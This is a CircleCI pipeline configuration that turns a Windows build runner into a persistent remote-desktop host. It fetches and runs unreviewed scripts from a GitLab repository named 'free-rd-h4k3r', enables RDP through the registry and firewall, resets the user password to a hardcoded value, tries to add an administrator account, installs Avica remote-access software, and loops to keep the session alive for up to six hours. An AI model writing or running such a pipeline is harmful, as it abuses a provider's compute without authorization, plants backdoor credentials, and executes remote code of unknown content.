version: 2.1
orbs:
  win: circleci/windows@5.0
jobs:
  build:
    executor:
      name: win/default
      size: medium
    
    steps:
      - run:
          name: Debug Setup with Verbose Output
          shell: powershell.exe
          no\_output\_timeout: 30m
          command: |
            Write-Host "🚀 Starting debug setup..." -ForegroundColor Green
            
            # Show environment info
            Write-Host "🔍 Environment Info:" -ForegroundColor Cyan
            Write-Host "User: $env:USERNAME"
            Write-Host "Computer: $env:COMPUTERNAME" 
            Write-Host "Python Version:" -NoNewline
            python --version
            
            # Download files with error checking
            Write-Host "\`n📥 Downloading files..." -ForegroundColor Yellow
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/free-rd-h4k3r/-/raw/main/setup.py" -OutFile "setup.py"
                Write-Host "✅ setup.py downloaded ($(Get-Item setup.py | Select-Object -ExpandProperty Length) bytes)"
            } catch {
                Write-Host "❌ Failed to download setup.py: $($\_.Exception.Message)" -ForegroundColor Red
            }
            
            try {
                Invoke-WebRequest -Uri "https://download.avica.com/AvicaLite\_v8.0.8.9.exe" -OutFile "Avica\_setup.exe"
                Write-Host "✅ Avica\_setup.exe downloaded ($(Get-Item Avica\_setup.exe | Select-Object -ExpandProperty Length) bytes)"
            } catch {
                Write-Host "❌ Failed to download Avica: $($\_.Exception.Message)" -ForegroundColor Red
            }
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/my-rdp/-/raw/main/show.bat" -OutFile "show.bat"
                Write-Host "✅ show.bat downloaded"
            } catch {
                Write-Host "❌ Failed to download show.bat: $($\_.Exception.Message)" -ForegroundColor Red
            }
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/my-rdp/-/raw/main/loop.bat" -OutFile "loop.bat" 
                Write-Host "✅ loop.bat downloaded"
            } catch {
                Write-Host "❌ Failed to download loop.bat: $($\_.Exception.Message)" -ForegroundColor Red
            }
            
            # List downloaded files
            Write-Host "\`n📁 Downloaded Files:"
            Get-ChildItem -Name "*.py", "*.exe", "\*.bat" | ForEach-Object {
                $size = (Get-Item $\_).Length
                Write-Host "  $\_ ($size bytes)" -ForegroundColor Cyan
            }
            
            # Install packages with verbose output
            Write-Host "\`n📦 Installing Python packages..." -ForegroundColor Yellow
            Write-Host "Installing requests..."
            python.exe -m pip install requests --quiet
            Write-Host "Installing Pillow..."
            python.exe -m pip install Pillow --quiet
            Write-Host "Installing pyautogui..."
            python.exe -m pip install pyautogui --quiet
            Write-Host "Installing telegraph..."
            python.exe -m pip install telegraph --quiet
            Write-Host "✅ All packages installed"
            
            # Show setup.py content (first 10 lines)
            if (Test-Path "setup.py") {
                Write-Host "\`n🔍 setup.py content preview:" -ForegroundColor Cyan
                Get-Content "setup.py" | Select-Object -First 10
                Write-Host "... (file continues)"
            }
            
            # Enable RDP
            Write-Host "\`n🔧 Enabling RDP..." -ForegroundColor Yellow
            Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name "fDenyTSConnections" -value 0
            Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
            Write-Host "✅ RDP enabled"
            
            # User setup
            Write-Host "\`n👤 Setting up users..." -ForegroundColor Yellow
            $currentUser = $env:USERNAME
            Write-Host "Current user: $currentUser"
            
            net user $currentUser TheDisa1a 2>$null
            Write-Host "✅ Password set for $currentUser"
            
            # Try to create runneradmin (like GitHub Actions)
            net user runneradmin TheDisa1a /add 2>$null
            if ($LASTEXITCODE -eq 0) {
                net localgroup administrators runneradmin /add 2>$null
                Write-Host "✅ runneradmin user created and added to administrators"
            } else {
                Write-Host "⚠️ Could not create runneradmin user (this is normal in CircleCI)" -ForegroundColor Yellow
            }
            
            # Start Avica installation
            Write-Host "\`n⚡ Starting Avica installation..." -ForegroundColor Yellow
            if (Test-Path "Avica\_setup.exe") {
                $avicaProcess = Start-Process "Avica\_setup.exe" -PassThru -NoNewWindow
                Write-Host "✅ Avica process started (PID: $($avicaProcess.Id))"
                
                # Wait for installation
                Write-Host "⏳ Waiting for Avica installation..."
                Start-Sleep -Seconds 20
                
                # Check if Avica is running
                $avicaRunning = Get-Process | Where-Object {$\_.ProcessName -like "*avica*"}
                if ($avicaRunning) {
                    Write-Host "✅ Avica processes found:" -ForegroundColor Green
                    $avicaRunning | Select-Object ProcessName, Id | Format-Table
                } else {
                    Write-Host "⚠️ No Avica processes found yet" -ForegroundColor Yellow
                }
            }
            
            # Run setup.py with detailed output
            Write-Host "\`n🐍 Running setup.py..." -ForegroundColor Yellow
            if (Test-Path "setup.py") {
                try {
                    # Set environment for better display support
                    $env:PYTHONUNBUFFERED = "1"
                    
                    Write-Host "Executing: python setup.py"
                    python setup.py 2>&1 | ForEach-Object { 
                        Write-Host "  $\_" -ForegroundColor White
                    }
                    
                    if ($LASTEXITCODE -eq 0) {
                        Write-Host "✅ setup.py completed successfully!" -ForegroundColor Green
                    } else {
                        Write-Host "⚠️ setup.py completed with exit code: $LASTEXITCODE" -ForegroundColor Yellow
                    }
                } catch {
                    Write-Host "❌ Error running setup.py: $($\_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "❌ setup.py file not found!" -ForegroundColor Red
            }
            
            Write-Host "\`n🎉 Debug setup completed! Look above for GoFile link!" -ForegroundColor Green
            
      - run:
          name: Start Services and Keep Active
          shell: cmd.exe
          no\_output\_timeout: 6h
          command: |
            echo 🔧 Starting services...
            if exist show.bat (
                echo Found show.bat, executing...
                call show.bat
            ) else (
                echo show.bat not found!
            )
            
            echo 🚀 Keeping session active...
            if exist loop.bat (
                call loop.bat
            ) else (
                echo loop.bat not found, using simple loop...
                :loop
                timeout /t 300 /nobreak >nul 2>&1
                echo Still running... %time%
                goto loop
            )
workflows:
  version: 2
  rdp-workflow:
    jobs:
      - build